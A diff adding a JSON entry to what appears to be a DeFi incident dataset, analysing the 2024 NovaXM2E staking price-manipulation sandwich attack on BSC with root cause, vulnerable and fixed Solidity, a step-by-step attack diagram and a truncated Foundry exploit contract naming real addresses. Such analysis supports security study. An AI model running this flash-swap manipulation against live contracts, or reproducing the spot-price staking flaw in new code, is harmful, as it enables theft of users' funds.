@@ -1,0 +1,35 @@
+{
+ "id": "2024__2024-08-20_NovaXM2E_StakingPriceSandwich",
+ "source_file": "2024/2024-08-20_NovaXM2E_StakingPriceSandwich.md",
+ "title": "NovaXM2E — Staking Price Manipulation Sandwich Attack Analysis",
+ "date": "2024-08-20",
+ "protocol": "NovaXM2E",
+ "chain": "BSC",
+ "loss_raw": "~25,000 USD",
+ "loss_usd": null,
+ "root_cause": "`stake()` converts tokens to USDT value before storing — after spot price manipulation, `withdraw()` returns more tokens than originally staked",
+ "attack_tx": "0xb1ad1188d620746e2e64785307a7aacf2e8dbda4a33061a4f2fbc9721048e012",
+ "vulnerable_contract": "0x55C9EEbd368873494C7d06A4900E8F5674B11bD2",
+ "classes": [
+  "staking-reward"
+ ],
+ "code_before": [
+  "❌ Vulnerable pattern: stake stores USDT value at spot price\nfunction stake(uint256 _poolId, uint256 _stakeValue) external {\n    uint256 usdtValue = _stakeValue * getTokenPrice();  //",
+  "❌ spot price used\n    stakes[msg.sender] = usdtValue;  // stored as USDT value\n    token.transferFrom(msg.sender, address(this), _stakeValue);\n}\n\nfunction withdraw(uint256 _stakeId) external {\n    uint256 usdtValue = stakes[msg.sender];\n    uint256 tokenAmount = usdtValue / getTokenPrice();  //",
+  "❌ reverse-calculated at current spot price\n    token.transfer(msg.sender, tokenAmount);  // over-pays based on manipulated price\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Correct code: store token quantity directly at stake time\nfunction stake(uint256 _poolId, uint256 _stakeValue) external {\n    stakes[msg.sender] = _stakeValue;  //",
+  "✅ store token quantity directly\n    token.transferFrom(msg.sender, address(this), _stakeValue);\n}\n\nfunction withdraw(uint256 _stakeId) external {\n    uint256 tokenAmount = stakes[msg.sender];  //"
+ ],
+ "steps": [
+  "[2] ► Swap USDT → NovaXM2E (large buy → price pumps)",
+  "[4] ► Swap half of NovaXM2E → USDT (price dumps)",
+  "► reverse-calculated at deflated price → receive more NovaXM2E",
+  "[7] ► Swap additional NovaXM2E → USDT"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─[1]─► PancakeSwap V2 Flash Swap: borrow 500,000 USDT\n  │\n  ├─[2]─► Swap USDT → NovaXM2E (large buy → price pumps)\n  │\n  ├─[3]─► tokenStake.stake(0, NovaXM2E balance / 2)\n  │         └─► USDT value recorded at inflated price\n  │\n  ├─[4]─► Swap half of NovaXM2E → USDT (price dumps)\n  │\n  ├─[5]─► Query stakeIndex = tokenStake.stakeIndex()\n  │\n  ├─[6]─► Call tokenStake.withdraw(stakeIndex)\n  │         └─► reverse-calculated at deflated price → receive more NovaXM2E\n  │\n  ├─[7]─► Swap additional NovaXM2E → USDT\n  │\n  ├─[8]─► Repay flash swap\n  │\n  └─[9]─► Total loss: ~25,000 USD",
+  "contract ContractTest is Test {\n    ITokenStake tokenStake = ITokenStake(0x55C9EEbd368873494C7d06A4900E8F5674B11bD2);\n    IERC20 NovaXM2E = IERC20(0xB800AFf8391aBACDEb0199AB9CeBF63771FcF491);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);\n\n    function pancakeCall(address, uint256, uint256, bytes calldata) public {\n        // [2] Buy large amount of NovaXM2E with USDT (price pumps)\n        swap_token_to_token(address(USDT), address(NovaXM2E), USDT.balanceOf(address(this)));\n\n        // [3] Stake half at inflated price\n        NovaXM2E.approve(address(tokenStake), NovaXM2E.balanceOf(address(this)));\n        tokenStake.stake(0, NovaXM2E.balanceOf(address(this)) / 2);\n\n        // [4] Sell half to dump the price\n        swap_token_to_token(address(NovaXM2E), ad"
+ ]
+}
